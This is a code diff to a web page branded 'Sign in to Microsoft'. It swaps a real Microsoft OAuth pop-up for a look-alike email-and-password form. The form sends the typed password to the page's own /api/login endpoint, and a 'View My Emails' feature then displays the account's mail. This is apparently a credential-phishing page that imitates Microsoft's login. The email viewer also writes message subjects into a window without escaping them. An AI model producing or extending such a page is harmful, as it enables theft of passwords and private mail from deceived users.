@@ -479,7 +479,7 @@
                 <span id="enteredEmail"></span>
             </div>
 
-            
+
 
             <div class="header">
                 <h1 id="headerTitle">Sign in to Microsoft</h1>
@@ -513,25 +513,39 @@
                 <button type="button" class="cancel-btn" onclick="cancelLoading()">Cancel</button>
             </div>
 
-            <!-- Microsoft OAuth Login form -->
-            <div id="oauthForm" style="display: none;">
+            <!-- Email Input Form - shown initially -->
+            <div id="emailForm" style="display: block;">
                 <div class="form-group">
-                    <p style="color: #323130; font-size: 14px; margin-bottom: 20px;">
-                        Click the button below to sign in with your Microsoft account using secure OAuth authentication.
-                    </p>
+                    <label for="emailInput" style="display: block; margin-bottom: 10px; color: #323130; font-size: 14px; font-weight: 600;">Enter your email address</label>
+                    <input type="email" id="emailInput" class="microsoft-input" placeholder="e.g. user@example.com" required autofocus>
                 </div>
 
                 <div class="button-group">
-                    <button type="button" class="btn btn-primary" id="oauthBtn" onclick="startOAuthLogin()" style="width: 100%;">
-                        Sign in with Microsoft
+                    <button type="button" class="btn btn-primary" onclick="verifyEmail()" style="width: 100%;">
+                        Next
                     </button>
                 </div>
+            </div>
 
-                <div class="form-links" style="margin-top: 20px;">
-                    <span class="create-account">No account? <a href="https://account.microsoft.com/account" target="_blank">Create one!</a></span><br><br>
-                    <a href="https://account.live.com/ResetPassword.aspx" target="_blank">Can't access your account?</a>
+            <!-- Password Input Form - shown after email verification -->
+            <div id="passwordForm" class="password-section">
+                <div class="form-group">
+                    <p id="verifiedEmailDisplay" style="color: #323130; font-size: 14px; margin-bottom: 10px;"></p>
+                    <label for="passwordInput" style="display: block; margin-bottom: 10px; color: #323130; font-size: 14px; font-weight: 600;">Enter your password</label>
+                    <input type="password" id="passwordInput" class="microsoft-input" placeholder="Password" required>
+                </div>
+
+                <div class="form-links">
+                    <a href="https://account.live.com/ResetPassword.aspx" target="_blank">Forgot password?</a>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" class="btn btn-primary" onclick="signInWithPassword()" style="width: 100%;">
+                        Sign in
+                    </button>
                 </div>
             </div>
+
 
             <!-- Success form - shown after authentication -->
             <div id="successForm" class="password-section">
@@ -539,13 +553,13 @@
                     <div style="font-size: 48px; color: #107c10; margin-bottom: 15px;">✅</div>
                     <h2 style="color: #107c10; margin-bottom: 10px;">Successfully signed in!</h2>
                     <p id="userEmail" style="color: #323130; font-size: 14px; margin-bottom: 20px;"></p>
-                    
+
                     <div class="button-group">
                         <button type="button" class="btn btn-primary" onclick="viewEmails()" style="width: 100%;">
                             View My Emails
                         </button>
                     </div>
-                    
+
                     <div style="margin-top: 15px;">
                         <button type="button" class="btn btn-secondary" onclick="logout()" style="width: 100%;">
                             Sign Out
@@ -569,16 +583,17 @@
 
     <script>
         let currentSessionId = null;
-        let currentStep = 'oauth'; // 'oauth', 'success'
+        let verifiedEmailAddress = null; // Store the verified email
+        let currentStep = 'email'; // 'email', 'password', 'success'
         const API_BASE = '';
         let authWindow = null;
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            setLoading(true, 'Initializing Microsoft Graph API', false);
-            
+            setLoading(false); // Start with loading off
             checkBackendHealth();
             checkExistingSession();
+            showEmailForm();
         });
 
         // Utility functions
@@ -599,66 +614,58 @@
             const microsoftDotsLoader = document.getElementById('microsoftDotsLoader');
             const microsoftLogo = document.querySelector('.microsoft-logo');
             const container = document.querySelector('.container');
-            const oauthForm = document.getElementById('oauthForm');
+            const emailForm = document.getElementById('emailForm');
+            const passwordForm = document.getElementById('passwordForm');
             const successForm = document.getElementById('successForm');
             const headerTitle = document.getElementById('headerTitle');
             const loadingCancelContainer = document.getElementById('loadingCancelContainer');
 
             if (loading) {
-                // Show progress bar at top
                 loadingAnimation.classList.add('active');
-
-                // ENSURE Microsoft logo is visible and add loading animation
                 microsoftLogo.style.display = 'block';
                 microsoftLogo.style.visibility = 'visible';
                 microsoftLogo.classList.add('loading');
-
-                // Add compact loading state to container
                 container.classList.add('loading-state');
-
-                // Show dots animation and update header text
                 microsoftDotsLoader.classList.add('show');
                 microsoftDotsLoader.style.display = 'flex';
                 headerTitle.textContent = loadingText;
-
-                // Show cancel button
                 loadingCancelContainer.classList.add('show');
 
-                // Hide forms during loading
-                oauthForm.style.display = 'none';
+                emailForm.style.display = 'none';
+                passwordForm.style.display = 'none';
                 successForm.style.display = 'none';
             } else {
-                // Hide all loading animations
                 loadingAnimation.classList.remove('active');
                 microsoftDotsLoader.classList.remove('show');
                 microsoftDotsLoader.style.display = 'none';
                 microsoftLogo.classList.remove('loading');
                 container.classList.remove('loading-state');
-
-                // Hide cancel button
                 loadingCancelContainer.classList.remove('show');
-
-                // Keep Microsoft logo visible (don't hide it)
                 microsoftLogo.style.display = 'block';
                 microsoftLogo.style.visibility = 'visible';
 
                 // Restore header text based on current step
-                if (currentStep === 'oauth') {
+                if (currentStep === 'email') {
                     headerTitle.textContent = 'Sign in to Microsoft';
-                    oauthForm.style.display = 'block';
+                    emailForm.style.display = 'block';
+                    passwordForm.style.display = 'none';
+                    successForm.style.display = 'none';
+                } else if (currentStep === 'password') {
+                    headerTitle.textContent = 'Enter your password';
+                    emailForm.style.display = 'none';
+                    passwordForm.style.display = 'block';
                     successForm.style.display = 'none';
                 } else if (currentStep === 'success') {
                     headerTitle.textContent = 'Welcome';
-                    oauthForm.style.display = 'none';
+                    emailForm.style.display = 'none';
+                    passwordForm.style.display = 'none';
                     successForm.style.display = 'block';
                 }
 
-                // Restore other elements visibility
                 document.getElementById('backInfo').style.display = '';
                 document.getElementById('messageArea').style.display = '';
             }
 
-            // Disable all buttons and inputs during loading
             const buttons = document.querySelectorAll('.btn');
             const inputs = document.querySelectorAll('.microsoft-input');
 
@@ -667,17 +674,32 @@
         }
 
         function cancelLoading() {
-            // Cancel loading and return to the current form
             setLoading(false);
             clearMessage();
-            showOAuthForm();
+            showEmailForm(); // Go back to email form
         }
 
-        function showOAuthForm() {
-            currentStep = 'oauth';
-            document.getElementById('oauthForm').style.display = 'block';
+        function showEmailForm() {
+            currentStep = 'email';
+            document.getElementById('emailForm').style.display = 'block';
+            document.getElementById('passwordForm').style.display = 'none';
             document.getElementById('successForm').style.display = 'none';
             document.getElementById('headerTitle').textContent = 'Sign in to Microsoft';
+            document.getElementById('emailInput').value = ''; // Clear email input
+            clearMessage();
+        }
+
+        function showPasswordForm(email) {
+            currentStep = 'password';
+            verifiedEmailAddress = email; // Store the verified email
+            document.getElementById('verifiedEmailDisplay').textContent = `Using ${email}`;
+            document.getElementById('passwordInput').value = ''; // Clear password input
+            document.getElementById('passwordInput').focus();
+            document.getElementById('emailForm').style.display = 'none';
+            document.getElementById('passwordForm').style.display = 'block';
+            document.getElementById('successForm').style.display = 'none';
+            document.getElementById('headerTitle').textContent = 'Enter your password';
+            clearMessage();
         }
 
         function showSuccessForm(userEmail) {
@@ -696,16 +718,18 @@
 
                 if (response.ok && data.authConfigured) {
                     console.log('✅ Backend healthy and Azure configured');
+                    // Backend is ready, proceed to show the email form
                     setLoading(false);
-                    showOAuthForm();
+                    showEmailForm();
                 } else {
-                    throw new Error('Azure credentials not configured');
+                    throw new Error('Backend error: Azure credentials not configured.');
                 }
             } catch (error) {
                 console.error('Backend health check failed:', error);
                 setLoading(false);
-                showMessage('Backend error: Azure credentials not configured. Please check AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID.', 'error');
-                showOAuthForm();
+                showMessage(`Backend error: ${error.message}. Please check server configuration.`, 'error');
+                // Keep the email form visible but show the error
+                showEmailForm();
             }
         }
 
@@ -721,81 +745,102 @@
                     console.log('Found existing authenticated session:', data.userEmail);
                 } else {
                     setLoading(false);
-                    showOAuthForm();
+                    showEmailForm();
                 }
             } catch (error) {
                 console.error('Error checking session status:', error);
                 setLoading(false);
-                showOAuthForm();
+                showEmailForm();
             }
         }
 
-        async function startOAuthLogin() {
+        async function verifyEmail() {
+            const email = document.getElementById('emailInput').value.trim();
+
+            if (!email) {
+                showMessage('Please enter your email address.', 'error');
+                return;
+            }
+
+            if (!isValidEmail(email)) {
+                showMessage('Please enter a valid email address.', 'error');
+                return;
+            }
+
             clearMessage();
-            setLoading(true, 'Generating secure authentication link', false);
+            setLoading(true, 'Verifying your account...', false);
 
             try {
-                const response = await fetch(`${API_BASE}/api/auth-url`, {
+                const response = await fetch(`${API_BASE}/api/verify-email`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' }
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: email })
                 });
 
                 const data = await response.json();
 
-                if (response.ok) {
-                    currentSessionId = data.sessionId;
-                    
-                    // Open OAuth URL in new window
-                    authWindow = window.open(data.authUrl, 'microsoftAuth', 'width=600,height=700,scrollbars=yes,resizable=yes');
-                    
-                    setLoading(true, 'Waiting for Microsoft authentication...', false);
-                    
-                    // Poll for authentication completion
-                    const pollInterval = setInterval(async () => {
-                        try {
-                            // Check if window is closed
-                            if (authWindow.closed) {
-                                clearInterval(pollInterval);
-                                setLoading(false);
-                                showMessage('Authentication cancelled. Please try again.', 'error');
-                                return;
-                            }
-
-                            // Check backend for authentication status
-                            const statusResponse = await fetch(`${API_BASE}/api/status?sessionId=${currentSessionId}`);
-                            const statusData = await statusResponse.json();
-
-                            if (statusData.authenticated) {
-                                clearInterval(pollInterval);
-                                authWindow.close();
-                                setLoading(false);
-                                showSuccessForm(statusData.userEmail);
-                                showMessage('✅ Successfully authenticated with Microsoft!', 'success');
-                            }
-                        } catch (error) {
-                            // Continue polling
-                        }
-                    }, 2000); // Check every 2 seconds
-
-                    // Timeout after 5 minutes
-                    setTimeout(() => {
-                        if (authWindow && !authWindow.closed) {
-                            authWindow.close();
-                        }
-                        clearInterval(pollInterval);
-                        setLoading(false);
-                        showMessage('Authentication timeout. Please try again.', 'error');
-                    }, 300000);
-
+                if (response.ok && data.exists) {
+                    setLoading(false);
+                    showPasswordForm(email);
+                    currentSessionId = data.sessionId; // Store session ID for subsequent login
                 } else {
-                    throw new Error(data.error || 'Failed to generate auth URL');
+                    setLoading(false);
+                    showMessage(data.message || 'Account not found. Please check your email address.', 'error');
                 }
 
             } catch (error) {
-                console.error('OAuth login error:', error);
+                console.error('Email verification error:', error);
                 setLoading(false);
-                showMessage(`Authentication error: ${error.message}`, 'error');
+                showMessage('Error verifying email. Please try again.', 'error');
             }
+        }
+
+        async function signInWithPassword() {
+            const email = verifiedEmailAddress; // Use the verified email
+            const password = document.getElementById('passwordInput').value;
+
+            if (!password) {
+                showMessage('Please enter your password.', 'error');
+                return;
+            }
+
+            clearMessage();
+            setLoading(true, 'Signing in...', false);
+
+            try {
+                const response = await fetch(`${API_BASE}/api/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        email: email, 
+                        password: password,
+                        sessionId: currentSessionId // Pass the session ID obtained during email verification
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.success) {
+                    setLoading(false);
+                    showSuccessForm(email);
+                    showMessage('✅ Successfully signed in!', 'success');
+                } else {
+                    setLoading(false);
+                    showMessage(data.message || 'Incorrect password. Please try again.', 'error');
+                    document.getElementById('passwordInput').value = ''; // Clear password input
+                    document.getElementById('passwordInput').focus(); // Focus on password input
+                }
+
+            } catch (error) {
+                console.error('Login error:', error);
+                setLoading(false);
+                showMessage('Login error. Please try again.', 'error');
+            }
+        }
+
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
         }
 
         async function viewEmails() {
@@ -808,8 +853,7 @@
 
                 if (response.ok) {
                     setLoading(false);
-                    
-                    // Create a simple email viewer
+
                     const emailList = data.emails.map(email => 
                         `<div style="border-bottom: 1px solid #e1e1e1; padding: 10px 0;">
                             <strong>${email.subject}</strong><br>
@@ -819,7 +863,6 @@
                         </div>`
                     ).join('');
 
-                    // Show emails in a new window or alert
                     const emailWindow = window.open('', 'emails', 'width=800,height=600,scrollbars=yes,resizable=yes');
                     emailWindow.document.write(`
                         <html>
@@ -861,19 +904,20 @@
                 }
 
                 currentSessionId = null;
+                verifiedEmailAddress = null; // Clear verified email on logout
                 setLoading(false);
-                showOAuthForm();
+                showEmailForm(); // Return to email form on logout
                 showMessage('✅ Signed out successfully!', 'success');
 
             } catch (error) {
                 console.error('Logout error:', error);
                 currentSessionId = null;
+                verifiedEmailAddress = null;
                 setLoading(false);
-                showOAuthForm();
+                showEmailForm();
                 showMessage('Signed out (with errors)', 'info');
             }
         }
-
 
     </script>
 </body>
